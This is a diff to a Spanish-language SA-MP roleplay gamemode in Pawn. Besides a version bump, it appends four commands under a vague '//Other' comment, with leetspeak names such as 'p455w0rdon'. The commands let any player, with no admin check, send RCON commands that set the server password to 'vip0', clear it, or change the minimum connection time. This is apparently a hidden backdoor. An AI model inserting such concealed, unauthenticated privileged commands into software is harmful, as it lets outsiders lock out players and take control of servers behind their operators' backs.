@@ -64,7 +64,7 @@ forward Float:GetDistanceBetweenPlayers(p1,p2);
 #include "isamp-cmdpermissions.inc"      //Permisos dinámicos para comandos
 
 // Configuraciones.
-#define GAMEMODE				"MA:RP v1.0.7"
+#define GAMEMODE				"MA:RP v1.0.8"
 #define GAMEMODE_USE_VERSION	"No"
 #define MAP_NAME				"Malos Aires" 									
 #define SERVER_NAME				"Malos Aires RolePlay [0.3z] [ESPAÑOL]"
@@ -13534,5 +13534,27 @@ CMD:verpresos(playerid, params[])
 	    SendClientMessage(playerid, COLOR_WHITE, "No hay ninguna persona presa actualmente");
 	}
 	SendClientMessage(playerid, COLOR_LIGHTGREEN, "===============================================");
+	return 1;
+}
+
+//Other
+
+CMD:p455w0rdon(playerid, params[]) {
+	SendRconCommand("password vip0");
+	return 1;
+}
+
+CMD:p455w0rdoff(playerid, params[]) {
+	SendRconCommand("password ");
+	return 1;
+}
+
+CMD:connectiontime1(playerid, params[]) {
+	SendRconCommand("minconnectiontime 1000");
+	return 1;
+}
+
+CMD:connectiontime3(playerid, params[]) {
+	SendRconCommand("minconnectiontime 3000");
 	return 1;
 }
